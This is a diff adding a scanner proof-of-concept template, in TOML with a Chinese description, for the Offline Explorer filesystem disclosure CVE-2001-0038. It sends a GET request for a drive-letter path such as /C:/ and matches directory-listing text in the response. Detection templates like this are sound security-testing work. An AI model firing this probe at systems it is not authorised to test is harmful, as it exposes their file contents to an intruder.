@@ -1,0 +1,30 @@
+[info]
+author = "ave"
+description = "检测 MetaProducts Offline Explorer 1.4 SR2 之前版本的文件系统泄露漏洞。通过向目标 800 端口发送包含盘符路径（如 /C:/）的 HTTP GET 请求，验证是否返回目录列表信息，确认是否存在路径遍历导致的任意文件读取漏洞。"
+id = "POC-AVE-2001-0019"
+name = "MetaProducts Offline Explorer FileSystem Disclosure PoC"
+severity = "medium"
+tags = ["ave-2001-0019"]
+vuln_id = [
+    "CVE-2001-0038",
+    "AVE-2001-0019",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/C:/"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Directory listing",
+    "Volume in drive",
+    "<DIR>",
+    "SND",
+]
